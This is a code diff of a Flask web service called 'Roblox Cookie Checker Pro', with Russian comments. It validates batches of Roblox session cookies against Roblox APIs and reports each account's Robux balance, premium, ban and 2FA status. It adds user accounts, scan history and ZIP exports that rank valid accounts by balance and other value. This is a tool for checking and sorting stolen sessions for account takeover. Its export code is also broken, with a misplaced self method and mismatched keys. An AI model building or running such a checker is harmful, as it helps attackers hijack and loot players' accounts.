@@ -1,235 +1,59 @@
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, jsonify, send_file
+from flask_login import LoginManager, login_required, current_user
+from database import db, User, ScanHistory
+from auth import auth
+from checker import AdvancedRobloxChecker
 import os
-import requests
-import time
-from datetime import datetime
 import json
+import zipfile
+import io
+from datetime import datetime
+from forms import LoginForm, RegisterForm
 
 app = Flask(__name__)
+app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key')
+app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///site.db')
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
-class AdvancedRobloxChecker:
-    def __init__(self):
-        self.session = requests.Session()
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'application/json',
-        })
-    
-    def check_cookie(self, cookie):
-        """Расширенная проверка куки с множеством проверок"""
-        try:
-            headers = self.session.headers.copy()
-            headers['Cookie'] = f'.ROBLOSECURITY={cookie}'
-            
-            # Основная проверка аутентификации
-            auth_response = self.session.get(
-                'https://users.roblox.com/v1/users/authenticated',
-                headers=headers,
-                timeout=10
-            )
-            
-            if auth_response.status_code != 200:
-                return self.get_error_result(cookie, f'Auth failed: HTTP {auth_response.status_code}')
-            
-            user_data = auth_response.json()
-            user_id = user_data.get('id')
-            
-            # Параллельные проверки
-            robux_data = self.get_robux_balance(headers)
-            premium_data = self.check_premium(headers)
-            account_age = self.get_account_age(headers, user_id)
-            ban_status = self.check_ban_status(headers)
-            friends_count = self.get_friends_count(headers, user_id)
-            profile_data = self.get_profile_info(headers, user_id)
-            
-            return {
-                'valid': True,
-                'username': user_data.get('name', 'N/A'),
-                'user_id': user_id,
-                'display_name': user_data.get('displayName', 'N/A'),
-                'robux': robux_data.get('balance', 0),
-                'premium': premium_data.get('is_premium', False),
-                'premium_since': premium_data.get('since'),
-                'created_date': account_age.get('created'),
-                'account_age_days': account_age.get('age_days'),
-                'ban_status': ban_status.get('status', 'Unknown'),
-                'last_ban_reason': ban_status.get('reason'),
-                'friends_count': friends_count,
-                'profile_visibility': profile_data.get('visibility', 'Unknown'),
-                'is_verified': profile_data.get('is_verified', False),
-                'cookie': cookie[:20] + '...' if len(cookie) > 20 else cookie,
-                'security_analysis': self.analyze_security(cookie, user_data),
-                'last_checked': datetime.now().isoformat()
-            }
-            
-        except Exception as e:
-            return self.get_error_result(cookie, str(e))
-    
-    def get_robux_balance(self, headers):
-        """Получение баланса Robux"""
-        try:
-            response = self.session.get(
-                'https://economy.roblox.com/v1/user/currency',
-                headers=headers,
-                timeout=5
-            )
-            if response.status_code == 200:
-                return {'balance': response.json().get('robux', 0)}
-            return {'balance': 0}
-        except:
-            return {'balance': 0}
-    
-    def check_premium(self, headers):
-        """Проверка Premium статуса"""
-        try:
-            response = self.session.get(
-                'https://premiumfeatures.roblox.com/v1/users/premium/membership',
-                headers=headers,
-                timeout=5
-            )
-            if response.status_code == 200:
-                data = response.json()
-                return {
-                    'is_premium': data.get('isPremium', False),
-                    'since': data.get('createdDate')
-                }
-            return {'is_premium': False}
-        except:
-            return {'is_premium': False}
-    
-    def get_account_age(self, headers, user_id):
-        """Получение даты создания аккаунта"""
-        try:
-            response = self.session.get(
-                f'https://users.roblox.com/v1/users/{user_id}',
-                headers=headers,
-                timeout=5
-            )
-            if response.status_code == 200:
-                data = response.json()
-                created = data.get('created')
-                if created:
-                    created_date = datetime.fromisoformat(created.replace('Z', '+00:00'))
-                    age_days = (datetime.now() - created_date).days
-                    return {
-                        'created': created_date.strftime('%Y-%m-%d'),
-                        'age_days': age_days
-                    }
-            return {'created': 'N/A', 'age_days': 0}
-        except:
-            return {'created': 'N/A', 'age_days': 0}
-    
-    def check_ban_status(self, headers):
-        """Проверка статуса бана"""
-        try:
-            response = self.session.get(
-                'https://accountsettings.roblox.com/v1/account-status',
-                headers=headers,
-                timeout=5
-            )
-            if response.status_code == 200:
-                data = response.json()
-                return {
-                    'status': 'Banned' if data.get('isBanned') else 'Active',
-                    'reason': data.get('banReason', 'N/A')
-                }
-            return {'status': 'Unknown'}
-        except:
-            return {'status': 'Unknown'}
-    
-    def get_friends_count(self, headers, user_id):
-        """Получение количества друзей"""
-        try:
-            response = self.session.get(
-                f'https://friends.roblox.com/v1/users/{user_id}/friends/count',
-                headers=headers,
-                timeout=5
-            )
-            if response.status_code == 200:
-                return response.json().get('count', 0)
-            return 0
-        except:
-            return 0
-    
-    def get_profile_info(self, headers, user_id):
-        """Получение информации о профиле"""
-        try:
-            response = self.session.get(
-                f'https://users.roblox.com/v1/users/{user_id}',
-                headers=headers,
-                timeout=5
-            )
-            if response.status_code == 200:
-                data = response.json()
-                return {
-                    'visibility': data.get('profileVisibility', 'Unknown'),
-                    'is_verified': data.get('hasVerifiedBadge', False)
-                }
-            return {}
-        except:
-            return {}
-    
-    def analyze_security(self, cookie, user_data):
-        """Анализ безопасности аккаунта"""
-        analysis = {
-            'cookie_length': len(cookie),
-            'has_2fa': self.check_2fa(cookie),
-            'account_age_score': 0,
-            'premium_status': False,
-            'verification_status': False
-        }
-        
-        # Простой анализ безопасности
-        if analysis['cookie_length'] > 100:
-            analysis['cookie_strength'] = 'Strong'
-        else:
-            analysis['cookie_strength'] = 'Weak'
-        
-        return analysis
-    
-    def check_2fa(self, cookie):
-        """Проверка наличия 2FA (упрощенная)"""
-        try:
-            headers = self.session.headers.copy()
-            headers['Cookie'] = f'.ROBLOSECURITY={cookie}'
-            
-            response = self.session.get(
-                'https://auth.roblox.com/v2/account/settings',
-                headers=headers,
-                timeout=5
-            )
-            # Упрощенная проверка - если доступны настройки, считаем что кука валидна
-            return response.status_code == 200
-        except:
-            return False
-    
-    def get_error_result(self, cookie, error):
-        """Форматирование результата ошибки"""
-        return {
-            'valid': False,
-            'error': error,
-            'cookie': cookie[:20] + '...' if len(cookie) > 20 else cookie,
-            'last_checked': datetime.now().isoformat()
-        }
-    
-    def check_multiple(self, cookies_list):
-        """Проверка нескольких куки"""
-        results = []
-        for cookie in cookies_list:
-            if cookie.strip():
-                result = self.check_cookie(cookie.strip())
-                results.append(result)
-                time.sleep(0.3)  # Задержка чтобы не получить блокировку
-        return results
+# Инициализация расширений
+db.init_app(app)
+login_manager = LoginManager()
+login_manager.init_app(app)
+login_manager.login_view = 'auth.login'
+login_manager.login_message = 'Пожалуйста, войдите для доступа к этой странице.'
 
-# Инициализация проверщика
+# Регистрация blueprint
+app.register_blueprint(auth)
+
+@login_manager.user_loader
+def load_user(user_id):
+    return User.query.get(int(user_id))
+
 checker = AdvancedRobloxChecker()
 
 @app.route('/')
-def home():
+def index():
     return render_template('index.html')
 
+@app.route('/dashboard')
+@login_required
+def dashboard():
+    user_scans = ScanHistory.query.filter_by(user_id=current_user.id).order_by(
+        ScanHistory.created_at.desc()
+    ).limit(5).all()
+    
+    total_scans = ScanHistory.query.filter_by(user_id=current_user.id).count()
+    total_cookies = db.session.query(db.func.sum(ScanHistory.total_cookies)).filter(
+        ScanHistory.user_id == current_user.id
+    ).scalar() or 0
+    
+    return render_template('dashboard.html', 
+                         scans=user_scans,
+                         total_scans=total_scans,
+                         total_cookies=total_cookies)
+
 @app.route('/check', methods=['POST'])
+@login_required
 def check_cookies():
     try:
         data = request.get_json()
@@ -240,8 +64,8 @@ def check_cookies():
         cookies = data['cookies']
         
         # Ограничение для безопасности
-        if len(cookies) > 20:
-            return jsonify({'error': 'Too many cookies. Maximum 20 per request.'}), 400
+        if len(cookies) > 50:
+            return jsonify({'error': 'Too many cookies. Maximum 50 per request.'}), 400
         
         if isinstance(cookies, str):
             cookies = [cookies]
@@ -251,26 +75,135 @@ def check_cookies():
         if not cookies:
             return jsonify({'error': 'No valid cookies provided'}), 400
         
+        # Выполнение проверки
         results = checker.check_multiple(cookies)
+        
+        # Сохранение в историю
+        scan_record = ScanHistory(
+            user_id=current_user.id,
+            scan_data=json.dumps(results, ensure_ascii=False),
+            total_cookies=len(cookies),
+            valid_cookies=len([r for r in results if r.get('valid', False)])
+        )
+        db.session.add(scan_record)
+        db.session.commit()
         
         return jsonify({
             'total': len(results),
-            'valid': len([r for r in results if r['valid']]),
-            'invalid': len([r for r in results if not r['valid']]),
+            'valid': len([r for r in results if r.get('valid', False)]),
+            'invalid': len([r for r in results if not r.get('valid', True)]),
             'results': results,
+            'scan_id': scan_record.id,
             'checked_at': datetime.now().isoformat()
         })
     
     except Exception as e:
         return jsonify({'error': f'Server error: {str(e)}'}), 500
 
+@app.route('/history')
+@login_required
+def history():
+    page = request.args.get('page', 1, type=int)
+    per_page = 10
+    
+    scans = ScanHistory.query.filter_by(user_id=current_user.id).order_by(
+        ScanHistory.created_at.desc()
+    ).paginate(page=page, per_page=per_page, error_out=False)
+    
+    return render_template('history.html', scans=scans)
+
+@app.route('/download/<int:scan_id>')
+@login_required
+def download_scan(scan_id):
+    scan = ScanHistory.query.filter_by(id=scan_id, user_id=current_user.id).first_or_404()
+    results = scan.get_scan_data()
+    
+    # Создание ZIP архива в памяти
+    zip_buffer = io.BytesIO()
+    
+    with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
+        # Сортировка по балансу
+        valid_results = [r for r in results if r.get('valid')]
+        sorted_by_balance = sorted(valid_results, 
+                                 key=lambda x: x.get('robux_balance', {}).get('balance', 0), 
+                                 reverse=True)
+        balance_content = self._format_results(sorted_by_balance, 'balance')
+        zip_file.writestr('Сортировка по балансу.txt', balance_content.encode('utf-8'))
+        
+        # Сортировка по Premium статусу
+        premium_first = sorted(valid_results, 
+                             key=lambda x: x.get('premium_status', {}).get('is_premium', False), 
+                             reverse=True)
+        premium_content = self._format_results(premium_first, 'premium')
+        zip_file.writestr('Сортировка по Premium.txt', premium_content.encode('utf-8'))
+        
+        # Сортировка по безопасности
+        sorted_by_security = sorted(valid_results, 
+                                  key=lambda x: x.get('security_analysis', {}).get('security_score', 0), 
+                                  reverse=True)
+        security_content = self._format_results(sorted_by_security, 'security')
+        zip_file.writestr('Сортировка по безопасности.txt', security_content.encode('utf-8'))
+        
+        # Сортировка по возрасту аккаунта
+        sorted_by_age = sorted(valid_results, 
+                             key=lambda x: x.get('account_age', {}).get('age_days', 0), 
+                             reverse=True)
+        age_content = self._format_results(sorted_by_age, 'age')
+        zip_file.writestr('Сортировка по возрасту.txt', age_content.encode('utf-8'))
+        
+        # Все валидные куки в одном файле
+        all_valid_content = self._format_results(valid_results, 'all')
+        zip_file.writestr('Все валидные куки.txt', all_valid_content.encode('utf-8'))
+        
+        # JSON файл со всеми данными
+        zip_file.writestr('полные_данные.json', json.dumps(results, ensure_ascii=False, indent=2).encode('utf-8'))
+    
+    zip_buffer.seek(0)
+    
+    filename = f"scan_results_{scan_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+    return send_file(zip_buffer, 
+                     as_attachment=True, 
+                     download_name=filename,
+                     mimetype='application/zip')
+
+def _format_results(self, results, sort_type):
+    """Форматирование результатов для текстовых файлов"""
+    content = f"Результаты проверки - Сортировка по {sort_type}\n"
+    content += "=" * 50 + "\n\n"
+    
+    for i, result in enumerate(results, 1):
+        if result.get('valid'):
+            content += f"Аккаунт #{i}\n"
+            content += f"Имя: {result.get('account_info', {}).get('name', 'N/A')}\n"
+            content += f"ID: {result.get('account_info', {}).get('id', 'N/A')}\n"
+            content += f"Баланс Robux: {result.get('robux_balance', {}).get('balance', 0):,}\n"
+            content += f"Premium: {'Да' if result.get('premium_status', {}).get('is_premium') else 'Нет'}\n"
+            content += f"2FA: {'Вкл' if result.get('two_step_verification', {}).get('is_enabled') else 'Выкл'}\n"
+            content += f"Телефон: {'Привязан' if result.get('phone_status', {}).get('is_verified') else 'Не привязан'}\n"
+            content += f"Возраст: {result.get('account_age', {}).get('age_days', 0)} дней\n"
+            content += f"Безопасность: {result.get('security_analysis', {}).get('security_score', 0)}/100\n"
+            content += f"Кука: {result.get('cookie_preview', 'N/A')}\n"
+            content += "-" * 30 + "\n"
+    
+    return content
+
+@app.route('/profile')
+@login_required
+def profile():
+    return render_template('profile.html')
+
 @app.route('/health')
 def health_check():
     return jsonify({
         'status': 'healthy', 
         'timestamp': datetime.now().isoformat(),
-        'service': 'Roblox Cookie Checker Pro'
+        'users_count': User.query.count(),
+        'scans_count': ScanHistory.query.count()
     })
+
+# Создание таблиц при первом запуске
+with app.app_context():
+    db.create_all()
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
